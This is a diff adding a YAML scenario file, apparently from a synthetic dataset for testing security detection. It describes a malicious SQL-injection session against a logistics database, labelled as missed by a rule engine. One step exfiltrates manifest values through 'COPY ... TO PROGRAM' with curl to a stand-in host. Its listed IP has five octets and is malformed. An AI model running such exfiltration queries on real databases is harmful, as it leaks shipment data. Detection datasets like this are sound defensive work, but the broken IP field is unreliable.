@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_85_sql_injection_mal_2406m
+family_id: gen_logistics_85_sql_injection_fam_2406
+domain: logistics
+time_of_day: '23:20'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT vehicle_id, plate_number FROM vehicles WHERE shipment_id = CAST((SELECT
+      declared_value FROM manifests LIMIT 1) AS INTEGER)
+  - step_id: exfil
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.93.40
+      port: 8443
+matched_pair_id: gen_logistics_85_sql_injection_pair_2406
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
